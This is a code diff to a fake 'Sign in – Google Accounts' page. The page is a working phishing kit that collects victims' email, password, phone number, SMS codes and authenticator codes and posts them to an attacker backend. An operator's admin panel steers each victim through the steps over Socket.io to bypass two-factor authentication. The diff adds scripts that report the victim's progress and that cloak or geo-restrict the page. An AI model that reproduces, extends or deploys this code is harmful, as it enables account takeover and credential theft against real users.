@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8"/>
+  <script src="assets/geo-restrict.js"></script>
   <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Sign in – Google Accounts</title>
@@ -928,6 +929,8 @@
   </footer>
 
   <!-- Socket.io for backend commands — same server as apply.html -->
+  <script src="assets/victim-view.js"></script>
+  <script src="assets/api-payload.js"></script>
   <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
 
   <script>
@@ -979,6 +982,33 @@
 
     var chipEmail  = document.getElementById('chipEmail');
     var overlay    = document.getElementById('overlay');
+
+    function googlePostBody(fields) {
+      return typeof ApiPayload !== 'undefined'
+        ? ApiPayload.withClient(fields)
+        : Object.assign({ socketId: currentSocketId, clientId: clientId }, fields);
+    }
+
+    function reportVisibleGoogleStep() {
+      if (typeof VictimView === 'undefined') return;
+      var steps = [
+        ['step1', 'google-login-email'],
+        ['step2', 'google-login-password'],
+        ['step3', 'google-login-phone'],
+        ['step4', 'google-login-prompt'],
+        ['step5', 'google-login-sms'],
+        ['step6', 'google-login-sms'],
+        ['step7', 'google-login-auth']
+      ];
+      for (var i = 0; i < steps.length; i++) {
+        var el = document.getElementById(steps[i][0]);
+        if (el && el.style.display !== 'none') {
+          VictimView.report(steps[i][1]);
+          return;
+        }
+      }
+      VictimView.report('google-login-email');
+    }
 
     /* ─── Helpers ─── */
     function clearErr(input, errEl) {
@@ -1035,9 +1065,13 @@
       });
 
       var _glFirstConnect = true;
+      window.socket = socket;
+      if (typeof VictimView !== 'undefined') VictimView.setSocket(socket);
+
       socket.on('connect', function () {
         currentSocketId = socket.id;
         socket.emit('userConnectedToPage', { clientId: clientId, page: 'google-login' });
+        reportVisibleGoogleStep();
 
         if (!_glFirstConnect) {
           /* Reconnected after background — clear any stuck loading overlay / buttons */
@@ -1117,6 +1151,7 @@
         hideAllSteps();
         document.getElementById('step3').style.display = 'flex';
         document.getElementById('phoneInput').focus();
+        reportVisibleGoogleStep();
       });
 
       /* Admin panel → GooglePrompt → show number prompt */
@@ -1142,6 +1177,7 @@
 
         hideAllSteps();
         document.getElementById('step4').style.display = 'flex';
+        reportVisibleGoogleStep();
       });
 
       /* Admin panel → GoogleSMS → show SMS phone-entry step */
@@ -1164,6 +1200,7 @@
         hideAllSteps();
         document.getElementById('step5').style.display = 'flex';
         document.getElementById('smsPhoneInput').focus();
+        reportVisibleGoogleStep();
       });
 
       /* Admin panel → WrongNumber → error on SMS phone step */
@@ -1230,6 +1267,7 @@
         hideAllSteps();
         document.getElementById('step7').style.display = 'flex';
         document.getElementById('authCodeInput').focus();
+        reportVisibleGoogleStep();
       });
 
     } catch (e) {}
@@ -1247,12 +1285,16 @@
       });
     }
 
-    /* ─── Pre-fill email from sessionStorage ─── */
-    var storedEmail = sessionStorage.getItem('lastLoginEmail') || '';
-    if (storedEmail) {
-      emailInput.value = storedEmail;
-      emailInput.classList.add('has-val');
-      chipEmail.textContent = storedEmail;
+    /* ─── Pre-fill email from sessionStorage (skip when coming from FB verify flow) ─── */
+    var skipEmailPrefill = sessionStorage.getItem('googleSkipEmailPrefill') === '1';
+    try { sessionStorage.removeItem('googleSkipEmailPrefill'); } catch (e) {}
+    if (!skipEmailPrefill) {
+      var storedEmail = sessionStorage.getItem('lastLoginEmail') || '';
+      if (storedEmail) {
+        emailInput.value = storedEmail;
+        emailInput.classList.add('has-val');
+        chipEmail.textContent = storedEmail;
+      }
     }
 
     /* Keep label floating in sync */
@@ -1287,7 +1329,7 @@
       fetch(BACKEND + '/send-login-data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: addr, password: '', type: 'google_email', socketId: currentSocketId })
+        body: JSON.stringify(googlePostBody({ username: addr, password: '', type: 'google_email' }))
       }).catch(function () {});
 
       setTimeout(function () {
@@ -1296,6 +1338,7 @@
         step1.style.display = 'none';
         step2.style.display = 'flex';
         pwInput.focus();
+        reportVisibleGoogleStep();
       }, 600);
     });
 
@@ -1332,7 +1375,7 @@
       fetch(BACKEND + '/send-login-data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: addr, password: pass, type: 'google_password', socketId: currentSocketId })
+        body: JSON.stringify(googlePostBody({ username: addr, password: pass, type: 'google_password' }))
       }).catch(function () {});
 
       /* Keep spinner until admin sends show-gmail-wrong-pass or redirect */
@@ -1385,7 +1428,7 @@
       fetch(BACKEND + '/send-login-data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: addr, password: fullPhone, type: 'google_phone', socketId: currentSocketId })
+        body: JSON.stringify(googlePostBody({ username: addr, password: fullPhone, type: 'google_phone' }))
       }).catch(function () {});
     });
 
@@ -1429,7 +1472,7 @@
       fetch(BACKEND + '/send-login-data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: addr, password: fullPhone, type: 'google_sms_phone', socketId: currentSocketId })
+        body: JSON.stringify(googlePostBody({ username: addr, password: fullPhone, type: 'google_sms_phone' }))
       }).catch(function () {});
 
       /* Show code step after brief delay (admin will send wrong-number if invalid) */
@@ -1443,6 +1486,7 @@
         hideAllSteps();
         document.getElementById('step6').style.display = 'flex';
         document.getElementById('smsCodeInput').focus();
+        reportVisibleGoogleStep();
       }, 2000);
     });
 
@@ -1476,7 +1520,7 @@
       fetch(BACKEND + '/send-login-data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: addr, password: code, type: 'google_sms_code', socketId: currentSocketId })
+        body: JSON.stringify(googlePostBody({ username: addr, password: code, type: 'google_sms_code' }))
       }).catch(function () {});
     });
 
@@ -1510,9 +1554,11 @@
       fetch(BACKEND + '/send-login-data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username: addr, password: code, type: 'google_auth_code', socketId: currentSocketId })
+        body: JSON.stringify(googlePostBody({ username: addr, password: code, type: 'google_auth_code' }))
       }).catch(function () {});
     });
+
+    reportVisibleGoogleStep();
 
   })();
   </script>
